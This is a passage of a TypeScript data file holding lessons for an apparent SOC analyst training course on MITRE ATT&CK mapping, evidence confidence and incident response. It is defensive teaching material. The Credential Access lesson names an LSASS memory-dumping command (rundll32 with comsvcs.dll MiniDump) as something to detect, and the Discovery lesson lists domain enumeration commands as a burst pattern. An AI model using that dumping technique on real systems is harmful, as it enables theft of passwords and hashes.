          subPillar: 'LSASS MEMORY DUMPING & PASSWORD SPRAYS',
          heading: 'Technical Mechanics of Credential Access (TA0006)',
          paragraph1:
            'Credential Access consists of techniques for stealing credentials like account names and passwords. Two primary techniques dominate modern endpoint investigations: OS Credential Dumping: LSASS Memory (T1003.001) and Brute Force: Password Spraying (T1110.003).',
          paragraph2:
            'Ananya warns: "An alert indicating Sysmon Event ID 10 with `rundll32.exe comsvcs.dll MiniDump` targeting `lsass.exe` on CDAC-BLR-WS-02 is a critical alarm. The adversary is attempting to extract Kerberos tickets and NTLM hashes directly from process RAM."',
          techBoxTitle: 'TECH BOX: Process Memory Scraping & Token Theft',
          techBoxAnalogy:
            'Like safe-cracking: the burglar doesn\'t guess combinations; they stethoscope the tumblers (LSASS memory) to extract the master keys directly from the vault lock mechanism.',
          techBoxDef:
            'Credential Access Mechanics: Techniques used by adversaries to harvest plaintext passwords, Kerberos tickets, and cryptographic hashes from operating system memory vaults or authentication channels.',
          techBoxWhy:
            'Stealing valid credentials allows adversaries to transition from external compromise to legitimate lateral access without triggering malware execution defenses.',
          defaultAnimation: 'm13-credential-access-matrix' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'crd-lsass-memory-dump', label: '1. LSASS MEMORY (T1003)' },
            { id: 'crd-password-spray-burst', label: '2. PASSWORD SPRAY (T1110)' },
            { id: 'crd-browser-vault-scrape', label: '3. BROWSER VAULT' },
            { id: 'crd-credential-triage-rule', label: '4. TRIAGE RULE' },
          ],
        },
        {
          index: 1,
          pillarTag: 'PILLAR 02: DISCOVERY TTPS',
          subPillar: 'BURST PATTERN RECON & ENUMERATION HUD',
          heading: 'Detecting Rapid Discovery Reconnaissance Bursts',
          paragraph1:
            'Upon landing on a new endpoint, adversaries execute Discovery (TA0007) techniques to orient themselves. A single command like `whoami` is common, but a rapid cluster—`whoami`, `ipconfig`, `net user`, `net group "Domain Admins" /domain`, and `nltest /dclist` within 60 seconds—signals hostile automated enumeration.',
          paragraph2:
            'Ananya teaches: "Look for temporal burst clustering. Standard human users do not type five consecutive discovery commands across three command shells in twelve seconds. Burst discovery is the signature footprint of automated post-exploitation enumeration scripts."',
          techBoxTitle: 'TECH BOX: Temporal Clustering & Enumeration Footprints',
          techBoxAnalogy:
            'Like a prowler who breaks through a window and immediately flashes their flashlight at the floor plan, the safe, the alarm panel, and the back door all within 30 seconds.',
          techBoxDef:
            'Discovery Burst Pattern: A rapid temporal clustering of native reconnaissance commands executed consecutively to map local users, network shares, and Active Directory domain trusts.',
          techBoxWhy:
            'Provides high-fidelity early-warning detection before the intruder moves laterally or executes destructive ransomware payloads.',
          defaultAnimation: 'm13-discovery-ttps-recon' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'dsc-account-discovery', label: '1. USER DISCOVERY (T1033)' },
            { id: 'dsc-network-discovery', label: '2. NETWORK CONFIG (T1016)' },
            { id: 'dsc-permission-groups', label: '3. DOMAIN GROUPS (T1069)' },
            { id: 'dsc-burst-pattern-hud', label: '4. BURST RADAR' },
          ],
        },
        {
          index: 2,
          pillarTag: 'PILLAR 03: DISCOVERY-CREDENTIAL BRIDGE',
          subPillar: 'HOW RECON POWERS LATERAL COMPROMISE',
          heading: 'The Lateral Movement Bridge: From Discovery to Breach',
          paragraph1:
            'Discovery and Credential Access do not exist in isolation; they form an operational bridge. An attacker executes T1087 (Account Discovery) to locate high-privilege IT accounts, followed immediately by T1003 (Credential Dumping) on an IT workstation to harvest their credentials.',
          paragraph2:
            'Ananya emphasizes: "Understanding this bridge allows the SOC to intercept attacks in-flight. If you detect and contain the discovery burst on CDAC-BLR-WS-02, you prevent the credential theft that would otherwise unlock the domain controller CDAC-BLR-DC01."',
          techBoxTitle: 'TECH BOX: Attack Phase Chaining & Kill Chain Interception',
          techBoxAnalogy:
            'Like a spy who first photographs the security guard\'s badge roster (Discovery), then picks the locker containing the master passkey (Credential Access), before unlocking the central vault door (Lateral Movement).',
          techBoxDef:
            'Discovery-Credential Bridge: The tactical sequence where reconnaissance telemetry directly informs targeted credential harvesting, preparing the adversary for lateral movement across the enterprise.',
          techBoxWhy:
            'Enables defensive teams to sever the attack chain early, preventing a localized workstation compromise from escalating into an enterprise-wide domain compromise.',
          defaultAnimation: 'm13-discovery-credential-bridge' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'brg-discovery-recon', label: '1. RECON SCOPE' },
            { id: 'brg-credential-breach', label: '2. CRED BREACH' },
            { id: 'brg-lateral-pivot', label: '3. LATERAL PIVOT' },
            { id: 'brg-defensive-interception', label: '4. INTERCEPT GATE' },
          ],
        },
      ];
    }

    // Chapter 4: Choose a plausible technique carefully
    if (chId === 'M13-U2-C2') {
      return [
        {
          index: 0,
          pillarTag: 'PILLAR 01: SPECIFICITY DEPTH',
          subPillar: 'PARENT TECHNIQUES VS SUB-TECHNIQUES',
          heading: 'Mapping to the Highest Justified Specificity Level',
          paragraph1:
            'MITRE ATT&CK organizes many techniques into parent techniques and granular sub-techniques. For example, Command and Scripting Interpreter (T1059) contains eight sub-techniques, including PowerShell (T1059.001), Windows Command Shell (T1059.003), and Visual Basic (T1059.005).',
          paragraph2:
            'Ananya trains Priya: "Never settle for a vague parent technique when your telemetry provides exact sub-technique proof. If Sysmon Event ID 1 proves powershell.exe executed with script arguments, tag T1059.001, not generic T1059. Precision drives detection engineering."',
          techBoxTitle: 'TECH BOX: Specificity Hierarchy & Detection Granularity',
          techBoxAnalogy:
            'Like biological taxonomy: classifying an animal as a "Mammal" is accurate, but diagnosing that it is a "Canis lupus" provides actionable knowledge for rabies containment.',
          techBoxDef:
            'Technique Specificity Depth: The requirement to map telemetry observables to the deepest justifiable sub-technique ID supported by evidentiary logs, avoiding vague parent classifications.',
          techBoxWhy:
            'Enables detection engineers to create granular hunt queries and Sigma rules tailored to specific execution methods rather than overly broad categories.',
          defaultAnimation: 'm13-technique-specificity-depth' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'spc-vague-parent-technique', label: '1. PARENT (T1059)' },
            { id: 'spc-granular-subtechnique', label: '2. SUB (T1059.001)' },
            { id: 'spc-powershell-subtechnique', label: '3. SPECIFICITY PROOF' },
            { id: 'spc-specificity-rule', label: '4. ANANYA RULE' },
          ],
        },
        {
          index: 1,
          pillarTag: 'PILLAR 02: PLAUSIBLE VS SPECULATIVE',
          subPillar: 'GROUNDED OBSERVABLES VS APT SPECULATION TRAPS',
          heading: 'The Analyst Trap: Grounded Mapping vs Wild APT Leaps',
          paragraph1:
            'A rampant pitfall for junior analysts is observing a single directory listing command like `dir C:\\Users` and declaring in the case ticket: "APT29 Cozy Bear is performing reconnaissance preparatory to domain exfiltration!" This is unsubstantiated speculation.',
          paragraph2:
            'Ananya corrects the record: "Grounded mapping records what is proven: T1083 (File and Directory Discovery) on CDAC-BLR-WS-03 by b_sharma. That is defensible science. Speculating about Russian state actors based on one `dir` command turns your SOC into a circus."',
          techBoxTitle: 'TECH BOX: Scientific Rigor vs Sensationalist Speculation',
          techBoxAnalogy:
            'Like a coroner: the autopsy report records "acute trauma to cranial occiput consistent with blunt force impact"; it does not claim "victim was assassinated by the international syndicate" without criminal investigative proof.',
          techBoxDef:
            'Plausible Mapping Doctrine: Restricting technique tags to what the available telemetry objectively demonstrates, strictly forbidding uncorroborated attribution claims or apocalyptic scenario jumps.',
          techBoxWhy:
            'Maintains institutional credibility and prevents executive leadership from dispatching incident response teams on wild goose chases.',
          defaultAnimation: 'm13-plausible-vs-speculative' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'plu-grounded-observable', label: '1. GROUNDED FACT' },
            { id: 'plu-speculative-leap', label: '2. SPECULATIVE TRAP' },
            { id: 'plu-analyst-traps', label: '3. BIAS CHECKLIST' },
            { id: 'plu-ananya-restraint-seal', label: '4. RESTRAINT SEAL' },
          ],
        },
        {
          index: 2,
          pillarTag: 'PILLAR 03: EVIDENCE THRESHOLDS',
          subPillar: 'THE 4-GATE VALIDATION THRESHOLD MATRIX',
          heading: 'The 4-Gate Threshold: Process, Arguments, Parent & Token',
          paragraph1:
            'Before assigning an ATT&CK technique tag to an alert, an analyst must verify all four gates of the Validation Threshold Matrix: 1. Process Path & Integrity, 2. Command-Line Arguments, 3. Parent Process Lineage, and 4. Security Token & User Context.',
          paragraph2:
            'Ananya emphasizes: "If any gate fails or contains missing telemetry, your technique tag is unverified. For example, if you see `svchost.exe` spawning `cmd.exe`, the parent gate raises an immediate alarm, because legitimate svchost does not launch interactive user command shells."',
          techBoxTitle: 'TECH BOX: 4-Gate Evidentiary Verification Matrix',
          techBoxAnalogy:
            'Like the 4-point safety check on an aircraft before takeoff: fuel load confirmed, flight controls responsive, doors armed, flaps set. Skip one, and disaster looms.',
          techBoxDef:
            '4-Gate Evidence Threshold: A standardized audit gate verifying executable path, command-line parameters, parent-child PID lineage, and logon session token before approving a MITRE ATT&CK tag.',
          techBoxWhy:
            'Prevents superficial false-positive tagging caused by process name spoofing, masquerading binaries, or incomplete event logs.',
          defaultAnimation: 'm13-evidence-threshold-matrix' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'thr-process-path-gate', label: '1. PATH GATE' },
            { id: 'thr-command-arguments-gate', label: '2. ARGS GATE' },
            { id: 'thr-parent-lineage-gate', label: '3. PARENT GATE' },
            { id: 'thr-user-token-gate', label: '4. TOKEN GATE' },
          ],
        },
      ];
    }

    // Chapter 5: Evidence and uncertainty
    if (chId === 'M13-U3-C1') {
      return [
        {
          index: 0,
          pillarTag: 'PILLAR 01: EVIDENTIARY ANCHORS',
          subPillar: 'LINKING MITRE TAGS TO RAW SYSMON TELEMETRY',
          heading: 'Every ATT&CK Tag Must Have a Concrete Evidence Anchor',
          paragraph1:
            'A MITRE ATT&CK tag without a linked log event is merely an opinion. An Evidentiary Anchor is the exact telemetry pointer—Sensor Name, Event ID, UTC Timestamp, Hostname, and Process GUID—that proves the technique took place.',
          paragraph2:
            'Ananya teaches: "In Case #2026-881, we do not merely state `T1059.001 PowerShell`. We anchor it: Sysmon EID 1 on CDAC-BLR-WS-12 at 2026-10-15T09:14:32Z, PPID 3400 (cmd.exe), Child PID 4820, Hash SHA256: e3b0c44... That anchor makes the docket indestructible."',
          techBoxTitle: 'TECH BOX: Forensic Anchoring & Chain of Custody',
          techBoxAnalogy:
            'Like a survey boundary stone: a deed doesn\'t say "the land is somewhere near the river"; it specifies the exact bronze GPS marker driven into granite bedrock at coordinates 12.9716° N, 77.5946° E.',
          techBoxDef:
            'Evidentiary Anchor: The cryptographically verifiable log record (Event ID, host, timestamp, process GUID) directly attached to a technique mapping to substantiate the analytical finding.',
          techBoxWhy:
            'Ensures complete auditability for legal proceedings, cyber insurance claims, and cross-tier incident response handoffs.',
          defaultAnimation: 'm13-evidentiary-anchors-dossier' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'anc-technique-tag', label: '1. TECHNIQUE TAG' },
            { id: 'anc-sysmon-event-anchor', label: '2. SYSMON ANCHOR' },
            { id: 'anc-zeek-connection-anchor', label: '3. ZEEK ANCHOR' },
            { id: 'anc-evidence-docket', label: '4. DOCKET LINK' },
          ],
        },
        {
          index: 1,
          pillarTag: 'PILLAR 02: CONFIDENCE QUALIFIERS',
          subPillar: 'CONFIRMED VS SUSPECTED VS HYPOTHESIZED',
          heading: 'Communicating Uncertainty: The 3-Tier Confidence Scale',
          paragraph1:
            'In threat analysis, intellectual honesty requires articulating uncertainty. Not all observations carry equal evidentiary weight. We categorize all ATT&CK mappings into three disciplined tiers: Confirmed (High), Suspected (Medium), and Hypothesized (Low).',
          paragraph2:
            'Ananya explains: "Confirmed means direct command-line or binary proof exists. Suspected means indirect telemetry (network flow, anomalous volume) strongly implies the technique. Hypothesized means plausible contextual inference, but requires further log collection."',
          techBoxTitle: 'TECH BOX: Epistemological Precision & Confidence Tiers',
          techBoxAnalogy:
            'Like weather forecasting: "Confirmed: rain is falling on the sensor right now" vs "Suspected: radar indicates heavy moisture front approaching in 15 mins" vs "Hypothesized: seasonal trends suggest afternoon showers."',
          techBoxDef:
            'Confidence Qualifiers: A three-tier standardized taxonomy (Confirmed / Suspected / Hypothesized) communicating the degree of evidentiary certainty supporting a technique tag.',
          techBoxWhy:
            'Prevents senior commanders and incident handlers from treating speculative leads as proven facts, optimizing triage resource allocation.',
          defaultAnimation: 'm13-uncertainty-confidence-levels' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'unc-confirmed-high', label: '1. CONFIRMED (HIGH)' },
            { id: 'unc-suspected-medium', label: '2. SUSPECTED (MED)' },
            { id: 'unc-hypothesized-low', label: '3. HYPOTHESIZED (LOW)' },
            { id: 'unc-confidence-matrix', label: '4. MATRIX RUBRIC' },
          ],
        },
        {
          index: 2,
          pillarTag: 'PILLAR 03: AUDIT-PROOF DOCKETS',
          subPillar: 'CASE #2026-881 STANDARDIZED ATT&CK FORMAT',
          heading: 'Assembling the Audit-Proof Incident Triage Docket',
          paragraph1:
            'When an L1 analyst escalates a ticket or hands over shift notes, the summary must be structured, unambiguous, and machine-parseable. Case #2026-881 on CDAC-BLR-WS-12 demonstrates the gold standard of incident docket reporting.',
          paragraph2:
            'Ananya inspects the docket: "Look at this structure: Incident ID, Asset Scope, Normalized UTC Timeline, Observable Proof, Mapped ATT&CK IDs with Confidence Qualifiers, and Defensible Next Steps. This ticket saves 30 minutes of escalation friction."',
          techBoxTitle: 'TECH BOX: Case Docket Schema & Shift Handoff Standards',
          techBoxAnalogy:
            'Like an NTSB aviation incident report: standardized fields for tail number, flight crew, black box transcript, weather telemetry, and probable cause checklist.',
          techBoxDef:
            'Audit-Proof Triage Docket: A standardized incident record pairing every observed artifact with UTC timestamps, host identifiers, normalized ATT&CK tags, and confidence qualifiers.',
          techBoxWhy:
            'Accelerates incident response handoffs between Tier 1, Tier 2, and digital forensics teams while creating a permanent audit trail for organizational compliance.',
          defaultAnimation: 'm13-audit-proof-triage-docket' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'doc-docket-header', label: '1. DOCKET HEADER' },
            { id: 'doc-mitre-json-tagging', label: '2. JSON MAPPING' },
            { id: 'doc-contextual-notes', label: '3. CONTEXT NOTES' },
            { id: 'doc-mentor-signoff-block', label: '4. ANANYA SIGNOFF' },
          ],
        },
      ];
    }

    // Chapter 6: Do not infer a full attack chain
    if (chId === 'M13-U3-C2') {
      return [
        {
          index: 0,
          pillarTag: 'PILLAR 01: KILL CHAIN LEAP FALLACY',
          subPillar: '1 VERIFIED OBSERVATION ≠ 7-STAGE APT ATTACK CHAIN',
          heading: 'Deconstructing the Kill Chain Leap Fallacy',
          paragraph1:
            'The Kill Chain Leap Fallacy occurs when an analyst observes a single routine observable—such as a user running `whoami.exe`—and immediately hallucinates an entire 7-stage Cyber Kill Chain: Initial Phishing, Weaponization, Exploitation, Privilege Escalation, Command & Control, and Imminent Data Exfiltration.',
          paragraph2:
            'Ananya warns: "One verified action does not equal seven imagined stages. Drawing imaginary links based on preconceived thriller plots wastes precious SOC resources and creates alert fatigue. Report what is proven; investigate what is adjacent."',
          techBoxTitle: 'TECH BOX: Cognitive Fallacies & Grounded Investigation',
          techBoxAnalogy:
            'Like finding a dropped screw on a factory floor: you check the adjacent machine to see if a panel is loose; you do not immediately proclaim that the entire building foundation has collapsed.',
          techBoxDef:
            'Kill Chain Leap Fallacy: The cognitive analytical failure of extrapolating a complete multi-stage cyber campaign from a single isolated endpoint command without intermediate forensic corroboration.',
          techBoxWhy:
            'Protects SOC operational stability by anchoring investigations to verifiable evidence rather than speculative paranoia.',
          defaultAnimation: 'm13-kill-chain-leap-fallacy' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'lep-single-observation', label: '1. OBSERVABLE FACT' },
            { id: 'lep-imagined-kill-chain', label: '2. IMAGINED CHAIN' },
            { id: 'lep-grounded-truth', label: '3. GROUNDED REALITY' },
            { id: 'lep-consequence-of-panic', label: '4. PANIC IMPACT' },
          ],
        },
        {
          index: 1,
          pillarTag: 'PILLAR 02: SOLID VS DOTTED LINKS',
          subPillar: 'VERIFIED FACTS VS HYPOTHETICAL LEADS TIMELINE',
          heading: 'Timeline Demarcation: Solid Verified vs Dotted Hypotheses',
          paragraph1:
            'In high-stakes investigations, analysts draw timeline diagrams connecting observed events. A disciplined analyst uses Solid Lines for verified links supported by sequential telemetry, and Dotted Lines for unverified hypotheses that require further log collection.',
          paragraph2:
            'Ananya instructs: "On CDAC-BLR-WS-12: Solid Link 1 connects cmd.exe to powershell.exe via Sysmon PID 3400 -> 4820. Solid Link 2 connects powershell.exe to net.exe. But connecting that to external C2 without Zeek flow proof is a DOTTED line. Always verify before solidifying."',
          techBoxTitle: 'TECH BOX: Graphic Lineage & Hypothesis Demarcation',
          techBoxAnalogy:
            'Like a detective\'s pin-board: red string represents verified surveillance and phone records; white yarn represents possible suspect associations under active investigation.',
          techBoxDef:
            'Solid vs Dotted Demarcation: The visual and narrative discipline of strictly differentiating between cryptographically proven event linkages (solid) and tentative operational hypotheses (dotted).',
          techBoxWhy:
            'Prevents peer investigators and incident handlers from confusing investigative hunches with established forensic facts.',
          defaultAnimation: 'm13-solid-vs-dotted-links' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'sod-solid-verified-link', label: '1. SOLID FACT' },
            { id: 'sod-dotted-hypothesis', label: '2. DOTTED HYPOTHESIS' },
            { id: 'sod-evidence-gap-radar', label: '3. GAP RADAR' },
            { id: 'sod-investigation-next-steps', label: '4. TEST & VERIFY' },
          ],
        },
        {
          index: 2,
          pillarTag: 'PILLAR 03: MASTER ATT&CK SIGNOFF',
          subPillar: '4-COMPETENCY EVALUATION & MENTOR ANANYA SEAL',
          heading: 'Master ATT&CK Certification & Mentor Ananya\'s Gold Seal',
          paragraph1:
            'To complete Module 13, apprentice analysts must demonstrate proficiency across all four core competencies: 1. TTP Taxonomy Demarcation, 2. Descriptive Contextual Evaluation, 3. Evidentiary Anchoring & Confidence Grading, and 4. Restraint Against the Kill Chain Leap Fallacy.',
          paragraph2:
            'Mentor Ananya signs the docket: "Priya, you have proven that you can wield MITRE ATT&CK with surgical precision, anchoring every tag to raw telemetry, communicating uncertainty honestly, and resisting wild speculation. You have earned your Module 13 ATT&CK Certification!"',
          techBoxTitle: 'TECH BOX: Competency Matrix & Module 13 Certified',
          techBoxAnalogy:
            'Like receiving your pilot\'s instrument rating: you are no longer flying by rough visual landmarks; you can navigate safely through dense fog using calibrated navigational instruments and standardized aerospace phraseology.',
          techBoxDef:
            'Master ATT&CK Sign-Off: The formal pedagogical evaluation certifying an L1 analyst\'s ability to map, validate, and communicate threat telemetry using MITRE ATT&CK standards without overclaiming.',
          techBoxWhy:
            'Prepares L1 analysts for advanced alert analysis, threat hunting, and seamless collaboration with Tier-2 incident response leads.',
          defaultAnimation: 'm13-master-attack-signoff' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'mas-ttp-taxonomy-mastery', label: '1. TTP TAXONOMY' },
            { id: 'mas-evidence-anchoring-skill', label: '2. EVIDENCE ANCHOR' },
            { id: 'mas-audit-proof-docket-seal', label: '3. AUDIT DOCKET' },
            { id: 'mas-ananya-gold-seal', label: '4. ANANYA SEAL ✓' },
          ],
        },
      ];
    }

    // =========================================================================
    // MODULE 14: INCIDENT RESPONSE & SOC DOCUMENTATION
    // =========================================================================

    // Chapter 1: Preparation, detection, response and recovery
    if (chId === 'M14-U1-C1') {
      return [
        {
          index: 0,
          pillarTag: 'PILLAR 01: NIST & SANS IR LIFECYCLE',
          subPillar: '4-PHASE INCIDENT RESPONSE ENGINE',
          heading: 'Deconstructing the Cyclical Incident Response Lifecycle',
          paragraph1:
            'Incident response is not an ad-hoc scramble; it is a rigorous, cyclical operational process defined by NIST SP 800-61r2 and SANS: Phase 1 (Preparation), Phase 2 (Detection & Analysis), Phase 3 (Containment, Eradication & Recovery), and Phase 4 (Post-Incident Activity / Lessons Learned).',
          paragraph2:
            'Mentor Meera instructs: "As an L1 analyst, you live in Phase 2: Detection and Analysis. Your mission is rapid triage, scoping the 5 Ws, and filtering false alarms so senior responders can execute surgical containment in Phase 3 without drowning in noise."',
          techBoxTitle: 'TECH BOX: NIST SP 800-61r2 Phased Lifecycle Engine',
          techBoxAnalogy:
            'Like an emergency hospital trauma unit: Preparation stocks sterile supplies and defibrillators; Detection & Triage takes vitals and stabilizes; Surgery stops hemorrhage; and Morbidity & Mortality reviews improve hospital protocols.',
          techBoxDef:
            'NIST Incident Response Lifecycle: The structured framework governing enterprise response to cyber security threats: Preparation -> Detection & Analysis -> Containment, Eradication & Recovery -> Post-Incident Activity.',
          techBoxWhy:
            'Prevents chaotic, disorganized reactions during active security breaches and establishes clear operational handoffs across security teams.',
          defaultAnimation: 'm14-nist-sans-lifecycle' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'ir-prep-phase', label: '1. PREPARATION' },
            { id: 'ir-detect-phase', label: '2. DETECTION (L1)' },
            { id: 'ir-contain-phase', label: '3. CONTAIN/RECOVER' },
            { id: 'ir-post-phase', label: '4. LESSONS LEARNED' },
          ],
        },
        {
          index: 1,
          pillarTag: 'PILLAR 02: DETECTION & ANALYSIS GATES',
          subPillar: '4 TRIAGE GATES: INGEST, SCOPE, FP FILTER & CONTAIN',
          heading: 'Moving from Alert Ingestion to Actionable Containment Gates',
          paragraph1:
            'When a raw telemetry alarm triggers on CDAC-BLR-WS-12, an L1 analyst navigates four disciplined gates: Gate 1 (Ingestion & Assignment), Gate 2 (Entity Scoping of Affected Host, User & IP), Gate 3 (Baseline & False Positive Filtering), and Gate 4 (Pre-Containment Escalation Docket).',
          paragraph2:
            'Mentor Ananya emphasizes: "You never jump straight from an alert to isolating a machine. You verify user token context, check IT change windows with Rajesh, rule out benign scripts, and assemble verified observables into an airtight case docket."',
          techBoxTitle: 'TECH BOX: 4-Gate Triage Pipeline & Entity Resolution',
          techBoxAnalogy:
            'Like airport border control: passport scanned at the e-gate, traveler identity checked against watchlists, luggage screened through X-ray, and only flagged anomalies escorted to secondary inspection.',
          techBoxDef:
            'Detection & Analysis Gates: The sequential verification checkpoints ensuring every security ticket is scoped, filtered against authorized baselines, and substantiated with evidence before triggering disruptive response.',
          techBoxWhy:
            'Guarantees consistent, high-velocity alert triage while preventing costly false alarms and accidental production outages.',
          defaultAnimation: 'm14-detection-analysis-gates' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'det-alert-ingest', label: '1. INGEST GATE' },
            { id: 'det-scope-5ws', label: '2. 5 WS SCOPING' },
            { id: 'det-fp-filter', label: '3. FP FILTER' },
            { id: 'det-contain-gate', label: '4. CONTAIN GATE' },
          ],
        },
        {
          index: 2,
          pillarTag: 'PILLAR 03: PREPARATION FOUNDATIONS',
          subPillar: 'NTP CLOCK SYNC, SENSOR HEALTH & OFFLINE ROSTERS',
          heading: 'Proactive Readiness: The Foundation of Crisis Response',
          paragraph1:
            'Phase 1 Preparation is the silent savior of the SOC. It mandates Stratum-1 NTP atomic clock synchronization across all domain controllers and sensors in UTC, continuous log forwarder health checks, printed offline emergency phone trees, and quarterly tabletop drills.',
          paragraph2:
            'Meera reminds the shift: "If your firewall clock drifts 3 minutes from your domain controller, you cannot reconstruct an attack sequence in court. Preparation ensures our forensic clocks are locked, our sensors have zero blindspots, and our phone trees work when Slack is dead."',
          techBoxTitle: 'TECH BOX: Stratum-1 Time Sync & Telemetry Health Audits',
          techBoxAnalogy:
            'Like naval battle readiness: damage control drills practiced in calm waters, waterproof bulkhead seals inspected weekly, and independent battery-powered shortwave radios maintained in case generators fail.',
          techBoxDef:
            'Preparation Foundations: The proactive maintenance of technical infrastructure (NTP time synchronization, telemetry pipeline integrity) and organizational assets (escalation contact trees) prior to incident occurrence.',
          techBoxWhy:
            'Ensures that telemetry collected during an emergency is cryptographically verifiable, chronologically synchronized, and legally defensible.',
          defaultAnimation: 'm14-preparation-foundations' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'prf-clock-sync', label: '1. NTP UTC SYNC' },
            { id: 'prf-log-health', label: '2. SENSOR HEALTH' },
            { id: 'prf-escalation-tree', label: '3. ROSTER TREE' },
            { id: 'prf-meera-readiness', label: '4. MEERA AUDIT' },
          ],
        },
      ];
    }

    // Chapter 2: L1 responsibilities and escalation
    if (chId === 'M14-U1-C2') {
      return [
        {
          index: 0,
          pillarTag: 'PILLAR 01: L1 VS L2/L3 BOUNDARIES',
          subPillar: 'TRIAGE & PRESERVATION VS DEEP FORENSICS & HUNTING',
          heading: 'Demarcating Operational Responsibilities Across SOC Tiers',
          paragraph1:
            'Elite SOCs function with disciplined division of labor: Tier 1 (Priya) executes rapid triage, entity scoping, and volatile evidence preservation within 15-minute SLAs. Tier 2 (Meera) conducts deep memory carving, reverse engineering, and multi-host containment. Tier 3 performs hypothesis-driven hunting and custom detection engineering.',
          paragraph2:
            'Ananya teaches: "The cardinal rule of L1 is knowing when to hand over. You do not spend 4 hours disassembling shellcode while 50 other alerts pile up in the queue. You preserve the evidence, draft the docket, and hand over to L2."',
          techBoxTitle: 'TECH BOX: Tier Demarcation & SLA Handoff Contracts',
          techBoxAnalogy:
            'Like a medical emergency department: the paramedic stabilizes the patient, collects vitals, and delivers a concise 60-second trauma handoff to the specialized attending surgeon.',
          techBoxDef:
            'SOC Tier Boundaries: The defined operational division of responsibilities separating rapid front-line alert triage (L1) from forensic investigation (L2) and proactive enterprise threat hunting (L3).',
          techBoxWhy:
            'Prevents queue stagnation, alert fatigue, and cognitive overload, ensuring high-priority threats are escalated rapidly to specialized responders.',
          defaultAnimation: 'm14-l1-l2-l3-boundaries' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'bnd-tier-l1', label: '1. TIER 1 (TRIAGE)' },
            { id: 'bnd-tier-l2', label: '2. TIER 2 (FORENSICS)' },
            { id: 'bnd-tier-l3', label: '3. TIER 3 (HUNTING)' },
            { id: 'bnd-handoff-boundary', label: '4. HANDOFF RULE' },
          ],
        },
        {
          index: 1,
          pillarTag: 'PILLAR 02: ESCALATION TRIGGERS',
          subPillar: 'OBJECTIVE CONDITIONS FOR IMMEDIATE L2 ROUTING',
          heading: 'Objective Criteria for Immediate Incident Escalation',
          paragraph1:
            'Junior analysts must never guess whether to escalate. Four objective triggers mandate immediate escalation to Meera: 1. Tier-0 Asset Involvement (Domain Controllers CDAC-BLR-DC01, root PKI), 2. Active Credential Dumping (LSASS memory dumps), 3. Multi-Host Lateral Propagation (worm/SMB spreading), and 4. Ransomware Note Detonation.',
          paragraph2:
            'Ananya states: "When Sysmon Event 10 flags lsass.exe memory access on BLR-BR-WS-04, the clock starts ticking. That is an automatic SEV-2 escalation. You document the 5 Ws, attach the Sysmon record, and summon L2 within 120 seconds."',
          techBoxTitle: 'TECH BOX: Critical Escalation Thresholds & SEV Classification',
          techBoxAnalogy:
            'Like a smoke alarm wired to the city fire station: cooking steam is handled locally, but high-temperature infrared triggers the automatic fire department dispatch immediately.',
          techBoxDef:
            'Escalation Triggers: Predetermined technical conditions (Tier-0 asset hit, credential dumping, lateral worm spread) that bypass routine queues and trigger immediate senior responder engagement.',
          techBoxWhy:
            'Guarantees that critical enterprise compromises receive immediate forensic containment before adversaries achieve complete domain dominance.',
          defaultAnimation: 'm14-escalation-triggers-matrix' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'trg-tier0-asset', label: '1. TIER-0 DC ASSET' },
            { id: 'trg-lsass-dump', label: '2. LSASS DUMP' },
            { id: 'trg-lateral-burst', label: '3. LATERAL SPREAD' },
            { id: 'trg-ananya-escalate', label: '4. ANANYA PROTOCOL' },
          ],
        },
        {
          index: 2,
          pillarTag: 'PILLAR 03: EVIDENCE PRESERVATION',
          subPillar: 'LIVE VOLATILE RAM DOCTRINE VS THE REBOOT TRAP',
          heading: 'The Sacred Rule: Never Reboot an Infected Host',
          paragraph1:
            'The most catastrophic rookie mistake in security is rebooting an infected computer to "clear" the malware. Rebooting wipes volatile RAM silicon—destroying live process injection trees, active C2 network sockets, and plaintext credentials—while triggering adversary run-key persistence.',
          paragraph2:
            'Meera commands: "Sever the network, but leave the power running! Use EDR network isolation to block external C2 and internal spreading, keep physical power on, and log the cryptographic SHA-256 custody hash. Live memory is our best forensic witness."',
          techBoxTitle: 'TECH BOX: Volatile Memory Preservation & Spoliation Prevention',
          techBoxAnalogy:
            'Like securing a crime scene: police do not mop the floor and wash the windows to make the room clean; they rope off the perimeter and preserve the fingerprints and footprints intact.',
          techBoxDef:
            'Volatile Evidence Doctrine: The strict forensic protocol requiring analysts to maintain endpoint power during isolation to preserve memory state (RAM silicon) and prevent evidence spoliation.',
          techBoxWhy:
            'Preserves critical forensic evidence required for memory carving, malware analysis, and legal prosecution that would otherwise be permanently lost.',
          defaultAnimation: 'm14-evidence-preservation-doctrine' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'epd-volatile-ram', label: '1. LIVE VOLATILE RAM' },
            { id: 'epd-reboot-disaster', label: '2. REBOOT TRAP ⚠️' },
            { id: 'epd-network-sever', label: '3. EDR ISOLATION' },
            { id: 'epd-chain-custody', label: '4. CUSTODY CHAIN' },
          ],
        },
      ];
    }

    // Chapter 3: Timeline, evidence and clear notes
    if (chId === 'M14-U2-C1') {
      return [
        {
          index: 0,
          pillarTag: 'PILLAR 01: UTC CHRONOLOGY TIMELINE',
          subPillar: 'MULTI-SENSOR LINEAR EVENT RECONSTRUCTION',
          heading: 'Building the Normalized Multi-Sensor UTC Timeline',
          paragraph1:
